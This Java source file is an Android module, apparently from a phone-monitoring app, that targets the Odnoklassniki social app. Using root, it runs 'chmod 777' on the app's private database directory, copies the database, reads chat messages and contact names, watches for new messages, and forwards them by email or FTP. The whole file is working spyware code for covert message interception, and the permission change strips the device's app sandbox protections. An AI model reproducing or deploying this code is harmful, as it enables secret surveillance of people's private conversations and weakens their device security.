package com.dwreload.modules;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import com.dwreload.FTPNotification;
import com.dwreload.MailNotification;
import com.dwreload.SettingsManager;
import com.dwreload.lib.FileUtil;
import com.dwreload.lib.IMessageBody;
import com.dwreload.lib.IMMessage;
import com.dwreload.services.AppService;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;
import android.util.Log;

@SuppressLint("SdCardPath")
public class OdklModule implements OnSharedPreferenceChangeListener {	
	private static final String PATH_DB = "/data/data/ru.ok.android/databases/odnklassniki.db";
	private static final String[] MESSAGES_COLUMNS = new String[] {"message", "_date", "mark_as_spam_allowed", "author_id"};
	private static final String[] CONTACTS_COLUMNS = new String[] { "user_id", "user_name" };
	private static final String SETTINGS_LASTDATE = "lastmsg_odkl";
	
	private String LOCAL_PATH_DB;
	
	private Context mContext;
	private SettingsManager mSettings;
	private long mLastMsgTimestamp;
	private FileObserver mObserver;
	private HashMap<String, String> mUsernames;
	private boolean mIsStarted;

	public OdklModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new HashMap<String, String>();
		this.mIsStarted = false;
		
		LOCAL_PATH_DB = FileUtil.getFullPath(context, "ok_messages.db");
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("ODKL_ENABLED")){
			if (mSettings.isOKEnabled()) {
				if (!mIsStarted) {
					start();
				}
			}
			else{
				if (mIsStarted) {
					stop();
				}
			}
		}
	}
	
	private static String getDbPath(){
		if (!new java.io.File(PATH_DB).exists()) {
			if (new java.io.File(PATH_DB + ".db").exists()) {
				return PATH_DB + ".db";
			}
		}
		
		return PATH_DB;
	}
	
	public synchronized void start()
		{
		if (!mSettings.isOKEnabled())
			{
			return;
			}
		if (!isOKAvailable())
			{
			return;
			}
		if (!AppService.isRootAvailable())
			{
			return;
			}
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/ru.ok.android/databases/*",
				"chmod 777 /data/data/ru.ok.android/databases",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));
			
		command.setCallback(new ICommandCallback()
			{
			@Override
			public void run()
				{
				FileUtil.copyFile(getDbPath(), LOCAL_PATH_DB);
				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastMsgTimestamp());
				mObserver = new OKFileObserver();
				mObserver.startWatching();
				mIsStarted = true;
				}
			});
		
		try
			{
			RootTools.getShell(true).add(command);
			}catch (Exception e) {}
		}
	
	private synchronized void stop()
		{
		mIsStarted = false;
		try
			{
			saveLastMsgTimestamp(mLastMsgTimestamp);
			if (mObserver != null)
				{
				mObserver.stopWatching();
				}
			} catch (Exception e) {}
			finally
				{
				mObserver = null;
				}
		}
	
	public void dispose()
		{
		stop();
		}
	
	protected synchronized void getNewChat()
		{
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/ru.ok.android/databases/*",
				"chmod 777 /data/data/ru.ok.android/databases");
		command.setCallback(new ICommandCallback()
			{
			@Override
			public void run()
				{
				_getNewChat();
				}
			});
		try
			{
			RootTools.getShell(true).add(command);
			} catch (Exception e) {}
		}
	
	private synchronized void _getNewChat()
		{
		if (!FileUtil.copyFile(getDbPath(), LOCAL_PATH_DB))
			{
			return;
			}
		Log.w("OK.RU", "database copy success");
		SQLiteDatabase db = null;
		try
			{
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);
			Log.w("OK.RU", "num of messages:");
			if (list == null)
				{
				Log.w("OK.RU", "0 (no messages)");
				return;
				}
			final long lastMsgTimestamp = mLastMsgTimestamp;
			mLastMsgTimestamp = getLastMsgTimestamp(db);
			db.close();
			db = null;
			
			if (list != null && list.size() > 0 && networkAvailable())
				{
				MailNotification MailNotify = new MailNotification(mContext);
				FTPNotification FTPNotify = new FTPNotification(mContext);
				boolean res1 = false;
				boolean res2 = false;
				if (mSettings.sendSocialToMail())
					{
					res1 = MailNotify.sendSocialToMail(list,4);
					}
				if (mSettings.sendSocialToFTP())
					{
					res2 = FTPNotify.sendSocialToFTP(list,4);
					}
				if (res1 || res2)
					{
					saveLastMsgTimestamp(mLastMsgTimestamp);			
					}
				else
					{
					mLastMsgTimestamp = lastMsgTimestamp;	
					}
				}	
			} 
			catch (Exception e)
				{
				Log.e("OK.RU", "achtung: " +e);
				}
			finally
				{
				if (db != null && db.isOpen())
					{
					db.close();
					}
				}
		}
	
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db)
		{
		Cursor c = null;
		try
			{
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			c = db.query("messages", MESSAGES_COLUMNS, "_date > " + Long.toString(mLastMsgTimestamp), null, null, null, null);
			Log.e("OdklModule", "mLastMsgTimestamp = "+ Long.toString(mLastMsgTimestamp));
			while (c.moveToNext())
				{
				String mess = c.getString(0);
				long date = c.getLong(1); /* time */
				int type = (c.getInt(2)==1 ? 1 : 2);
				String userid = c.getString(3);
				//Log.w("OK.RU", "message" +mess);
				message = new IMMessage(date, mess, getUserName(userid), type);
				if (date > mLastMsgTimestamp) messages.add(message);
				}
			return messages;
		} catch(Exception e)
			{
			return null;	
			}
		finally
			{
			if (c != null)
				{
				c.close();
				}
			}
		}
	
	private synchronized String getUserName(String userid)
		{
		if (mUsernames.containsKey(userid))
			{
			return mUsernames.get(userid);
			}
		SQLiteDatabase db = null;
		Cursor c = null;
		try
			{
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("users",  CONTACTS_COLUMNS, "user_id = ?", new String[] { userid }, null, null, null);
			if (c.moveToFirst())
				{
				String username = c.getString(1);
				mUsernames.put(userid, username);
				return username;
				}
			return "Unnown";
			}
		catch(Exception e)
			{
			return "Unnown";
			}
		finally
			{
			if (db != null && db.isOpen())
				{
				db.close();
				}
			if (c != null)
				{
				c.close();
				}
			}
		}
	
	private long getLastMsgTimestamp()
		{
		SQLiteDatabase db = null;
		Cursor c = null;
		try
			{
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(_date) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			}
		catch(Exception e)
			{
			return new Date().getTime();
			}
		finally
			{
			if (db != null && db.isOpen())
				{
				db.close();
				}
			if (c != null)
				{
				c.close();
				}
			}
		}
	
	private long getLastMsgTimestamp(SQLiteDatabase db)
		{
		Cursor c = null;
		try
			{
			c = db.rawQuery("SELECT MAX(_date) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			}
		catch(Exception e)
			{
			return new Date().getTime();
			}
		finally
			{			
			if (c != null)
				{
				c.close();
				}
			}
		}
	
	private Boolean isOKAvailable()
		{
		try
			{
			mContext.getPackageManager().getPackageInfo("ru.ok.android", PackageManager.GET_ACTIVITIES);
			return true;
			}
		catch (NameNotFoundException e)
			{
			return false;
			}
		}
	
	private synchronized void saveLastMsgTimestamp(long lastMsgTimestamp)
		{
		if (lastMsgTimestamp == 0)
			{
			return;
			}
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		Editor editor = settings.edit();
		editor.putLong(SETTINGS_LASTDATE, lastMsgTimestamp);
		editor.commit();
		}
	
	private Boolean networkAvailable()
		{
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null)
			{
			return false;
			}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI)
			{
			return false;
			}
		return info.isConnectedOrConnecting();
		}

	private class MyCommandCapture extends CommandCapture
		{
		private ICommandCallback callback;
		public MyCommandCapture(String... command)
			{
			super(0, command);
			}
		
		public void setCallback(ICommandCallback callback)
			{
			this.callback = callback;
			}
		
		@Override
		public void commandCompleted(int id, int exitcode)
			{
			if (callback != null)
				{
				callback.run();
				}
			}
		}
	
	private interface ICommandCallback
		{
		public void run();
		}
	
	private class OKFileObserver extends FileObserver
		{
		private static final long UPDATE_TIOMEOUT = 10 * 1000L;
		
		private long lastUpdate;

		public OKFileObserver()
			{
			super(getDbPath(), FileObserver.MODIFY);
			}

		@Override
		public synchronized void onEvent(int event, String path)
			{
			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT)
				{
				return;
				}
			lastUpdate = now;

			new Thread(new Runnable()
				{
				@Override
				public void run()
					{
					try
						{
						Thread.sleep(UPDATE_TIOMEOUT);
						}
					catch (InterruptedException e)
						{
						e.printStackTrace();
						}
					if (!mSettings.DayReports()) getNewChat();
					}
				}).start();
			}
		}
	
	public void GetALL()
		{
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastMsgTimestamp());
		getNewChat();	
		}
	}
